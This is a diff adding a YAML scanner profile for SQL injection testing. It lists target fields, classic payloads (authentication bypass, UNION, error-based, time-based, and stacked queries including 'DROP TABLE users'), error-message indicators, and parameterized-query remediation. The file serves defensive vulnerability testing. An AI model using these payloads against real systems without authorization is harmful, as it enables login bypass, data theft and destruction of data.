@@ -1,0 +1,119 @@
+# SQL Injection - Basic Attack Profile
+# This file defines payloads for testing SQL injection vulnerabilities
+
+name: "SQL Injection - Basic"
+category: "injection"
+severity: "critical"
+description: "Tests for classic SQL injection vulnerabilities in user input fields"
+
+# Fields commonly vulnerable to SQL injection
+target_fields:
+  - "username"
+  - "email"
+  - "login"
+  - "password"
+  - "search"
+  - "query"
+  - "id"
+  - "user_id"
+  - "order"
+  - "sort"
+  - "filter"
+
+# Attack payloads to test
+payloads:
+  # Authentication bypass
+  - "' OR '1'='1"
+  - "' OR '1'='1' --"
+  - "' OR 1=1 --"
+  - "admin' --"
+  - "admin'/*"
+  - "' OR 'x'='x"
+  - "') OR ('1'='1"
+  
+  # UNION-based injection
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL, NULL--"
+  - "' UNION SELECT NULL, NULL, NULL--"
+  - "' UNION ALL SELECT NULL--"
+  
+  # Error-based injection
+  - "'"
+  - "''"
+  - "`"
+  - "``"
+  - ","
+  - '"'
+  - '""'
+  - "/"
+  - "//"
+  - "\\"
+  - ";"
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+  
+  # Time-based blind injection
+  - "'; WAITFOR DELAY '0:0:5'--"
+  - "'; SELECT SLEEP(5)--"
+  - "' OR SLEEP(5)--"
+  
+  # Stacked queries
+  - "'; DROP TABLE users--"
+  - "'; INSERT INTO users VALUES('hacked')--"
+
+# Indicators that suggest successful injection
+success_indicators:
+  response_contains:
+    - "SQL syntax error"
+    - "mysql_fetch"
+    - "MySQL"
+    - "PostgreSQL"
+    - "SQLite"
+    - "ORA-"
+    - "Oracle"
+    - "ODBC"
+    - "Microsoft SQL"
+    - "syntax error"
+    - "unclosed quotation mark"
+    - "quoted string not properly terminated"
+    - "You have an error in your SQL syntax"
+    - "Warning: mysql_"
+    - "Warning: pg_"
+    - "Warning: sqlite_"
+  status_codes:
+    - 500
+    - 503
+  response_time_gt: 5  # seconds (for time-based detection)
+
+# How to fix this vulnerability
+remediation: |
+  Use parameterized queries or prepared statements instead of string concatenation.
+  
+  Example (Python with psycopg2):
+  
+  # ❌ BAD - Vulnerable to SQL injection
+  query = f"SELECT * FROM users WHERE username='{username}'"
+  cursor.execute(query)
+  
+  # ✅ GOOD - Parameterized query
+  query = "SELECT * FROM users WHERE username=%s"
+  cursor.execute(query, (username,))
+  
+  Example (Python with SQLAlchemy):
+  
+  # ❌ BAD
+  db.execute(f"SELECT * FROM users WHERE id={user_id}")
+  
+  # ✅ GOOD
+  db.execute(text("SELECT * FROM users WHERE id=:id"), {"id": user_id})
+  
+  Additional recommendations:
+  - Use an ORM (SQLAlchemy, Django ORM) when possible
+  - Implement input validation and sanitization
+  - Apply principle of least privilege to database accounts
+  - Enable SQL query logging for monitoring
+
+references:
+  - "https://owasp.org/www-community/attacks/SQL_Injection"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+  - "https://portswigger.net/web-security/sql-injection"
